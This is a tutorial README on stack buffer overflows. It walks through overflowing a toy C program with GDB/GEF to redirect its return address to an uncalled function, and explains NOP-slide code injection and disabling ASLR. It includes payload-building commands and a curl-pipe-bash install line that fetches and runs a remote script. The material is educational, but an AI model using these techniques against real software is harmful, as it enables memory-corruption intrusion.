# Executing code with buffer overflows

![Call Stack](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Call_stack_layout.svg/342px-Call_stack_layout.svg.png)

Whenever you call a function, you add a "stack frame" onto the stack memory
which contains information about the function's local variables, its parameters,
and more importantly its return address.

Programs have something called an "instruction pointer" which points to the area
in memory the current instruction being executed is located.

Whenever a function returns, the stack frame is popped off the call stack and
the instruction pointer is set to the return address.

If we were somehow able to somehow overwrite this return address, it could be
possible for us to manipulate the program to execute a function that wasn't
meant to be executed, or even execute code that we ourselves inject into the
program's memory.

# GDB

GDB (**G**NU **D**e**b**ugger) is a useful program that allows us to "peak"
inside a program and check out areas of memory, namely values stored in
registers.

Being able to peer inside memory is supremely useful if you're attempting to
perform a buffer overflow attack and you happen to have access to the actual
program.

![GDB](https://user-images.githubusercontent.com/38366553/170348178-e19fe05b-6be3-43a9-8ddf-437a15dfce49.png)

You can try installing it from [this website](https://www.sourceware.org/gdb/download/)
or, if you're using a Debian based linux distro, a simple apt install will do
```console
$ sudo apt install gdb
```
For macOS (non-M1) you can use  
``` console
$ brew install gdb
```

# GEF

GEF (**G**DB **E**nhanced **F**eatures) has all the same features as GDB, but
with a little extra which will be handy for performing a buffer overflow attack.

Installing GEF is fairly simple, as all you need to do is run the following command:
```
$ curl -fsSL http://gef.blah.cat/sh | bash
```

[Read more](https://gef.readthedocs.io/en/master/)

# Using gdb to perform a simple buffer overflow attack

We will be trying to attack a very simple c program (source code can be found in simple/main.c)

```c
#include <stdio.h>

void hello() {
    printf("Hello\n");
}

int main() {
    char buf[20];
    gets(buf);
}
```
In this attack, we will make the function print hello even though the hello() function is not called in main().
To actually be able to attack programs with buffer overflow that we are compiling we have to compile with the ``` -fno-stack-protector``` flag because gcc is smart doesn't allow you to go over buffer. 

1. Start gdb  
   ```console
   $ gdb <exec>
   ```  
   
2. Try to run the executable in gdb    

   ```
   gef> run 
   ```   
   
3. Try to find the length of the buffer so we know where we should start putting useful information 
   
   ```
   gef> pattern create -n 8 <length>
   ```  

   Generates a long string with unique substrings of length 8 (because 64-bit = 8 bytes). 
![image](https://user-images.githubusercontent.com/64151468/170775124-db2d1b32-2c70-43ce-9e1f-9fb50a14ebfe.png)

This facilitates the determination of offsets since there's no repeats in the substring which means we can look for the string that breaks the program and then we know where exactly the buffer ends. 
   - Run the program and copy the long string generated by pattern create into the input field.
The output would look something like this:   

 <img width="993" alt="Screen Shot 2022-05-25 at 3 03 19 PM" src="https://user-images.githubusercontent.com/64151468/170350128-b1f69c21-96c0-4ade-a043-856e1fb77f95.png"> 
    - The boxed portion ($rbp) would be able to tell us how much did we overwrite the buffer.   
      We can also use the following command to look it up.
      
      
      gef> x $rbp 
          
    
4. Look up the size of the buffer  
   ```
   gef> pattern offset <rbp_value>  
   ```
   
   <img width="484" alt="Screen Shot 2022-05-25 at 3 04 07 PM" src="https://user-images.githubusercontent.com/64151468/170350435-180895bd-c15d-4de7-a8ef-06597a40f41c.png"> 
   
   We can see the size of the buffer and likely endianess to use that to create our input.  

6. Find the address of hello() function so we can put it at the end of the buffer.  
    ``` 
    gef> info functions  
    ```
    <img width="410" alt="Screen Shot 2022-05-24 at 3 24 21 PM" src="https://user-images.githubusercontent.com/64151468/170339491-36dc6544-b5e4-42b0-b712-420315696880.png">

7. Exit out of gdb with Ctrl+D. Use python to put the input we want into a file (since the address may not be printable characters)  

```console
$ python3 -c "print('A'*(<offset>+8)+<address_of_function_in_correct_endian>)" > input.txt
```  
![image](https://user-images.githubusercontent.com/64151468/170773900-53a10063-d7a5-4e99-8398-9ba28bf127c2.png)
Big endian stores the most significant byte first while little endian stores the least significant byte first. This would vary depends on the computer.  

example: 
```console
$ python3 -c "print('A'*(32+8)+'\x69\x51\x55\x55\x55\x55\x00\x00')" > input.txt
```
We need to add 8 bytes to the end of the buffer before we put the address because of how things are stored in 64-bit machines.   

<img width="512" alt="image" src="https://user-images.githubusercontent.com/64151468/170560753-e621cecd-e8db-4b79-8832-83fcde06abe4.png">

We have to first overwrite rbp (which is 8 bytes address) to reach where the saved return address is and that's what we want to overwrite because that's where the program looks for when determining where it's going next.  

8. Run program in gdb with the input file.

    ```console
    $ gdb <exec>
    ```  
    ```
    gef> run < input.txt  
    ```  
   And then you should see the output.
                       
<img width="772" alt="Screen Shot 2022-05-25 at 3 11 30 PM" src="https://user-images.githubusercontent.com/64151468/170350970-5d8f1b4a-efaa-4681-9565-22c6596affab.png">

# Code Injection

Most modern programs forbid code that is stored in the stack from begin ran, but this isn't true in all cases.
In gcc, you can enable stack execution with `$ gcc main.c -z execstack`.

If a program is vulnerable to a buffer overflow and has stack execution enabled, you could potentially
run your own code by sending a malicious payload into the program.

![code injection](https://user-images.githubusercontent.com/38366553/170850793-353f125a-7c29-4172-8713-f7a1b13ad9a2.png)

Let's say we have a very large buffer, if we first fill it up with our malicious code, then overwrite the return address to
point to the start of the code. Then, once the function ends, it tries to return from the function, but instead it jumps
to our malicious code and starts executing from there.

Now, that's all well and good, but we can't be exactly sure that the address of the buffer is going to be the same everytime.

![memory](https://user-images.githubusercontent.com/38366553/170850946-5a15c676-269a-44e8-b297-b40a0f04afb1.png)

At the high addresses of memory, the program stores the command line arguments and environmental variables,
and we can't be certain of what arguments and environmental variables the user running the program will
use, so the exact address of the buffer may shift up and down by a bit each time.

However, we can increase the "landing zone" of our code by making use of "NOP slides."
NOP, or No Operation, is an instruction that tells the cpu to "do nothing" and move to the next instruction.

![NOP](https://user-images.githubusercontent.com/38366553/170850921-f8af1cb1-9e73-48ea-aa69-f81fb4a84ddf.png)

So, if instead of just injection our malicious code into the buffer, we also add a large number of
NOPs before it, as long as we set the return address to any of the NOPs, the instruction pointer will
"slide" over all of them and run our injected code from the start.

# ASLR

By default, most modern OS's have address space layout randomization (ASLR) enabled, which randomly
orders functions in memory before executing the program to make it more difficult to reliably
use buffer overflows to jump to functions not meant to be executed.

If you run a program using gdb, ASLR is disabled by default, but if you try running it outside of gdb,
then you'd get a segmentation fault.
```
$ run < input.txt
```

There are techniques of bypassing this, but just for learning about buffer overflows, you can disable
it temporarily using
```
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
and re-enable it with
```
$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
if you're using Linux.
